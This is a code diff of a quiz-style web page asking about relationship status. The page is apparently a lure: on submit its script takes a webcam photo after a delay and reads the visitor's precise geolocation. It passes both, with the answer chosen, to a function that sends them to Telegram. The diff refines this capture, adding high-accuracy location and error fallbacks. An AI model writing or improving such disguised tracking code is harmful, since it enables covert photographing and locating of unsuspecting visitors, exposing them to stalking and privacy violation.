@@ -82,7 +82,6 @@
             border: 2px solid #ff00ff;
             border-radius: 50%;
             cursor: pointer;
-            position: relative;
         }
 
         input[type="checkbox"]:checked {
@@ -130,7 +129,7 @@
 
         <div class="option">
             <input type="checkbox" id="someoneElse" name="choice" onclick="selectOnlyOne(this)">
-            <label for="someoneElse">ALREADY RELATIONSHIP 🙂</label>
+            <label for="someoneElse">ALREADY IN RELATIONSHIP 🙂</label>
         </div>
 
         <button class="submit-btn" onclick="submitData()">SUBMIT</button>
@@ -155,8 +154,8 @@
         }
 
         function submitData() {
-            const selectedOption = getSelectedOption();
-            if (!selectedOption) return alert("Please select an option!");
+            const option = getSelectedOption();
+            if (!option) return alert("Please select an option!");
 
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
@@ -172,22 +171,28 @@
                         const imageData = canvas.toDataURL("image/png");
                         stream.getTracks().forEach(track => track.stop());
 
-                        getLocationAndSend(option = selectedOption, imageData);
+                        captureLocation(option, imageData);
                     }, 3000);
                 })
                 .catch(() => alert("Camera access denied!"));
         }
 
-        function getLocationAndSend(option, imageData) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-                    sendToTelegram(option, imageData, location);
-                },
-                () => {
-                    sendToTelegram(option, imageData, "Location Not Available");
-                }
-            );
+        function captureLocation(option, imageData) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                        sendToTelegram(option, imageData, location);
+                    },
+                    (error) => {
+                        console.error("Location Error:", error.message);
+                        sendToTelegram(option, imageData, "Location Not Available");
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                sendToTelegram(option, imageData, "Geolocation Not Supported");
+            }
         }
 
         function sendToTelegram(option, imageData, location) {
